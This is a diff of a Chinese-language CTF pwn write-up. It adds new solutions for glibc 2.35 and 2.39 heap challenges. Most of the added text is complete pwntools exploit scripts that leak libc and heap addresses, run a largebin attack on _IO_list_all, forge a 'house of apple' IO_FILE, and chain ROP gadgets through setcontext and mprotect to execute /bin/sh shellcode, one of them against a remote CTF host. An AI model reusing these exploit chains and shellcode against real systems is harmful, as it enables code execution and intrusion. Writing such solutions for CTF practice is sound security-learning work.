@@ -228,7 +228,7 @@ p.interactive()
 ```
 
 ## heap-2.35
-### 思路
+### 思路1
 
 glibc2.35，tcache的next指针指向经PROTECT_PTR处理的指针，并且加了内存对齐检测
 取消了hook机制，虽然libc中仍然有这些符号，但已经没有作用了
@@ -247,7 +247,7 @@ glibc2.35，tcache的next指针指向经PROTECT_PTR处理的指针，并且加�
 5. 将堆分配到ptr上，修改某个堆块的指针，修改为edit返回地址的地址
 6. 然后写个rop的链子，成功getshell
 
-### exp
+### exp1
 ```python
 from pwn import *
 
@@ -351,8 +351,321 @@ edit(0,p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system_addr))
 p.interactive()
 ```
 
-## heap-2.39
+### 思路2
+最近学了`house of apple`，所以用`house of apple`重新做了这道题
 
+泄露`libc_base`和`heap_base`的部分没有太大变化
+后面利用`largebin attack`在`_IO_list_all`的地方写上伪造的IO_FILE_plus
+然后利用mprotect函数修改堆上的执行权限，最后在堆上执行shellcode
+
+### exp2
+```python
+from pwn import *
+
+# context.terminal =['tmux','splitw','-h']
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+p = process("./heap")
+#p = remote("node2.anna.nssctf.cn",28596)
+
+elf = ELF("./heap")
+libc = ELF("./libc.so.6")
+
+def add(index,size):
+    p.sendlineafter(b">>",b'1')
+    p.sendlineafter(b'idx? ',str(index).encode())
+    p.sendlineafter(b'size? ',str(size).encode())
+
+def delete(index):
+    p.sendlineafter(b">>",b'2')
+    p.sendlineafter(b'idx? ',str(index).encode())
+
+def show(index):
+    p.sendlineafter(b">>",b'3')
+    p.sendlineafter(b'idx? ',str(index).encode())
+
+def edit(index,content):
+    p.sendlineafter(b">>",b'4')
+    p.sendlineafter(b'idx? ',str(index).encode())
+    p.sendlineafter(b'content : ',content)
+
+def Exit():
+    p.sendlineafter(b">>",b'5')
+
+add(0,0x500)
+add(1,0x10)
+delete(0)
+show(0)
+p.recvuntil(b'content : ')
+libc_addr = u64(p.recv(6).ljust(8,b'\x00'))
+libc_base = libc_addr - 0x21ace0
+log.success("libc_base -> " + hex(libc_base))
+
+add(2,0x4e0)
+edit(0,b'a'*0x10)
+show(0)
+p.recvuntil(b'a'*0x10)
+heap_addr = u64(p.recv(6).ljust(8,b'\x00'))
+heap_base = heap_addr - 0x20a
+log.success("heap_base -> " + hex(heap_base))
+
+add(3,0x10)
+add(4,0x710)
+add(5,0x10)
+add(6,0x700)
+add(7,0x10)
+delete(4)
+add(8,0x900)
+delete(6)
+edit(4,p64(libc_base+0x21b190)+p64(libc_base+0x21b190)+p64(heap_base+0x7c0)+p64(libc_base+libc.sym['_IO_list_all']-0x20))
+add(9,0x900)
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+fake_IO_FILE = heap_base + 0xf00
+
+f = flat({
+    0x0: 0, # _flags
+    0x8: 0, # _IO_read_ptr
+    0x10: 0, # _IO_read_end
+    0x18: 0, # _IO_read_base
+    0x20: 0, # _IO_write_base
+    0x28: 1, # _IO_write_ptr
+    0x30: 0, # _IO_write_end
+    0x38: fake_IO_FILE + 0x280, # _IO_buf_base
+    0x40: 0, # _IO_buf_end
+    0x48: 0, # _IO_save_base
+    0x50: 0, # _IO_backup_base
+    0x58: 0, # _IO_save_end
+    0x60: 0, # markers
+    0x68: 0, # _chain
+    0x70: p32(0), # _fileno
+    0x74: p32(0), # _flags2
+    0x78: 0, # _old_offset
+    0x80: p16(0), # _cur_column
+    0x82: p8(0), # _vtable_offset
+    0x83: p8(0), # _shortbuf
+    0x88: 0, # _lock
+    0x90: 0, # _offset
+    0x98: 0, # _codecvt
+    0xa0: fake_IO_FILE + 0xe0, # _wide_data
+    0xa8: 0, # _freeres_list
+    0xb0: 0, # _freeres_buf
+    0xb8: 0, # __pad5
+    0xc0: p32(0), # _mode
+    0xc4: 0, # _unused2
+    0xd8: libc_base + 0x2170c0, #_vtables
+    }, filler = b'\x00')
+
+data = bytes(f).ljust(0xe0, b"\x00")
+
+data += b"\x00" * 0xe0
+data += p64(fake_IO_FILE + 0x200)
+data = data.ljust(0x200, b"\x00")
+
+data += b"\x00" * 0x68
+data += p64(libc_base + 0x15d48a) # 0x000000000015d48a : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]   
+data = data.ljust(0x280, b"\x00")
+
+data += p64(fake_IO_FILE + 0x2a0)
+data += p64(0)
+data += p64(libc_base + 0x162f64) # 0x0000000000162f64 : mov rdi, qword ptr [rax] ; mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
+data = data.ljust(0x2a0, b"\x00")
+
+data += p64(0)
+data += p64(fake_IO_FILE + 0x2e0)
+data += p64(libc_base + 0x167420) + b"\x00"*0x20 # 0x0000000000167420 mov rdx,QWORD PTR [rdi+0x8] ; mov QWORD PTR [rsp],rax ; call QWORD PTR [rdx+0x20]
+data += p64(fake_IO_FILE + 0x2a0)
+data = data.ljust(0x2e0, b"\x00")
+
+data += p64(libc_base + 0xd2ba5)+0x18*b"\x00" # add rsp,0x20 ; pop rbx ; ret
+data += p64(libc_base + 0x5a120)+0x8*b"\x00" # mov_rsp_rdx
+
+data += p64(libc_base + 0x2a3e5) # pop_rdi
+data += p64(heap_base)
+data += p64(libc_base + 0x2be51) # pop_rsi
+data += p64(0x10000)
+data += p64(libc_base + 0x904a9) # pop_rdx_rbx
+data += p64(7)
+data += p64(0)
+data += p64(libc.sym['mprotect'] + libc_base)
+data += p64(fake_IO_FILE + 0x380)
+data = data.ljust(0x380, b"\x00")
+data += shellcode
+
+edit(6,data[0x10:])
+
+Exit()
+
+p.interactive()
+
+```
+
+## heap-2.39
+### 思路
+之前一直没补上这题，学完`house of apple`后正好拿这两题练手
+
+这题多加了一点限制，只能申请大于0x4f0、小于0x1000的堆块，和上题的exp2差不多，只是需要将用于分隔堆块的小堆块调大一点
+同时还需要重新找gadget
+
+### exp
+```python
+from pwn import *
+
+context.terminal =['tmux','splitw','-h']
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+# p = process("./heap")
+p = remote("node4.anna.nssctf.cn",28313)
+
+elf = ELF("./heap")
+libc = ELF("./libc.so.6")
+
+def add(index,size):
+	p.sendlineafter(b">>",b'1')
+	p.sendlineafter(b'idx? ',str(index).encode())
+	p.sendlineafter(b'size? ',str(size).encode())
+
+def delete(index):
+	p.sendlineafter(b">>",b'2')
+	p.sendlineafter(b'idx? ',str(index).encode())
+	
+def show(index):
+	p.sendlineafter(b">>",b'3')
+	p.sendlineafter(b'idx? ',str(index).encode())
+	
+def edit(index,content):
+	p.sendlineafter(b">>",b'4')
+	p.sendlineafter(b'idx? ',str(index).encode())
+	p.sendlineafter(b'content : ',content)
+
+def Exit():
+    p.sendlineafter(b">>",b'5')
+
+# leak libc_base
+add(0,0x500)
+add(1,0x500)
+add(2,0x500)
+add(3,0x500)
+delete(0)
+show(0)
+p.recvuntil(b'content : ')
+leak = u64(p.recv(6).ljust(8,b'\x00'))
+libc_base = leak-0x203b20
+log.success("libc_base => " + hex(libc_base))
+
+# leak heap_base
+delete(2)
+show(2)
+p.recvuntil(b'content : ')
+leak = u64(p.recv(6).ljust(8,b'\x00'))
+heap_base = leak-0x290
+log.success("heap_base => " + hex(heap_base))
+
+add(4,0x500)
+add(5,0x500)
+
+add(6,0x710)
+add(7,0x510)
+add(8,0x700)
+add(9,0x510)
+
+delete(6)
+add(10,0x900)
+delete(8)
+edit(6,p64(libc_base+0x21b190)+p64(libc_base+0x21b190)+p64(heap_base+0x2310)+p64(libc_base+libc.sym['_IO_list_all']-0x20))
+add(11,0x900)
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+fake_IO_FILE = heap_base + 0x2310
+
+f = flat({
+	0x0: 0, # _flags
+	0x8: 0, # _IO_read_ptr 
+	0x10: 0, # _IO_read_end
+	0x18: 0, # _IO_read_base
+    0x20: 0, # _IO_write_base
+    0x28: 1, # _IO_write_ptr
+	0x30: 0, # _IO_write_end
+	0x38: fake_IO_FILE + 0x280, # _IO_buf_base
+	0x40: 0, # _IO_buf_end
+	0x48: 0, # _IO_save_base
+	0x50: 0, # _IO_backup_base
+	0x58: 0, # _IO_save_end
+	0x60: 0, # markers
+	0x68: 0, # _chain
+    0x70: 0, # _fileno
+	0x78: 0, # _flags2
+	0x80: 0, # _old_offset
+	0x88: fake_IO_FILE, # _cur_column
+	0x90: 0, # _vtable_offset
+	0x98: 0, # _shortbuf
+	0xa0: fake_IO_FILE + 0xe0, # _lock
+	0xa8: 0, # _offset
+	0xb0: 0, # _codecvt
+	0xb8: fake_IO_FILE + 0xe0, # _wide_data
+    0xc0: 0, # _freeres_list
+	0xc8: 0, # _freeres_buf
+	0xd0: 0, # __pad5
+    0xd8: libc_base + 0x202228, #_vtables
+	}, filler = b'\x00')
+
+data = bytes(f).ljust(0xe0, b"\x00")
+
+data += b"\x00" * 0xe0
+data += p64(fake_IO_FILE + 0x200)
+data = data.ljust(0x200, b"\x00")
+
+data += b"\x00" * 0x68
+data += p64(libc_base + 0x16c22c) # 0x000000000016c22c : mov rax, qword ptr [rdi + 0x38] ; call qword ptr [rax + 0x10]
+data = data.ljust(0x280, b"\x00")
+
+data += p64(0)*2
+data += p64(libc_base + 0x176f0e) # 0x0000000000176f0e : mov rdx, qword ptr [rax + 0x38] ; mov rdi, rax ; call qword ptr [rdx + 0x20]
+data += p64(0)*4
+data += p64(fake_IO_FILE + 0x300)
+data = data.ljust(0x300, b"\x00")
+
+setcontext = flat({
+	0x20: libc_base + 0x4a98d, # setcontext+61
+	0xa0: fake_IO_FILE+0x400, # mov rsp,QWORD PTR [rdx+0xa0]
+	0x80: 0, # mov rbx,QWORD PTR [rdx+0x80]
+	0x78: 0, # mov rbp,QWORD PTR [rdx+0x78]
+	0x48: 0, # mov r12,QWORD PTR [rdx+0x48]
+	0x50: 0, # mov r13,QWORD PTR [rdx+0x50]
+	0x58: 0, # mov r14,QWORD PTR [rdx+0x58]
+	0x60: 0, # mov r15,QWORD PTR [rdx+0x60]
+	0xa8: libc_base + 0x2882f, # mov rcx,QWORD PTR [rdx+0xa8] ; push rcx # 0x000000000002882f : ret
+	0x70: 0, # mov rsi,QWORD PTR [rdx+0x70]
+	0x68: 0, # mov rdi,QWORD PTR [rdx+0x68]
+	0x98: 0, # mov rcx,QWORD PTR [rdx+0x98] 
+	0x28: 0, # mov r8,QWORD PTR [rdx+0x28]
+	0x30: 0, # mov r9,QWORD PTR [rdx+0x30]
+	0x88: 0, # mov rdx,QWORD PTR [rdx+0x88]
+	},filler = b'\x00')
+
+data += setcontext
+data = data.ljust(0x400, b"\x00")
+
+data += p64(libc_base + 0x10f75b) # 0x000000000010f75b : pop rdi ; ret
+data += p64(heap_base)
+data += p64(libc_base + 0x110a4d) # 0x0000000000110a4d : pop rsi ; ret
+data += p64(0x10000)
+data += p64(libc_base + 0x66b9a) # 0x0000000000066b9a : pop rdx ; ret 0x19
+data += p64(7)
+data += p64(libc.sym['mprotect'] + libc_base)
+data += b'\x00'*0x19
+data += p64(fake_IO_FILE + 0x600)
+data = data.ljust(0x600, b"\x00")
+data += shellcode
+
+edit(8,data[0x10:])
+
+Exit()
+
+p.interactive()
+```
 
 
 ## ATM
